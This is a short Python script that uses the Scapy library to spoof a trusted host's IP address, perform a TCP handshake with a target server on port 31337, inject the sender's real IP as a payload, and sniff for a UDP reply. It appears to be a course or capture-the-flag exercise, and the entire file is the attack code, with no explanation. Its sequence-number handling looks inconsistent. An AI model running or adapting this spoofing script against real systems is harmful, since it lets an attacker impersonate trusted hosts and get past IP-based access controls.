from scapy.all import *


def main(args):
  localip = args[0]
  serverip = args[1]
  trustedip = args[2]
  trustedport = 31337
  
  sport = random.randint(1024,65535)
  
  ip = IP(src=trustedip, dst=serverip)
  SYN=TCP(sport=sport,dport=int(trustedport),flags='S',seq=1000)
  SYNACK=sr1(ip/SYN)
  
  ACK=TCP(sport=sport, dport=int(trustedport), flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 1)
  send(ip/ACK)
  
  
  spoof = ip / TCP(sport=sport, dport=trustedport, seq=SYNACK.ack+2, ack=SYNACK.seq+1) / Raw(localip)
  spoof.show()
  fs = "udp and host " + localip + " and port " + str(trustedport)
  send(spoof)
  pkts = sniff(filter=fs, count=1)
  pkts.show()
  
  
if __name__ == "__main__":
  main(sys.argv[1:])
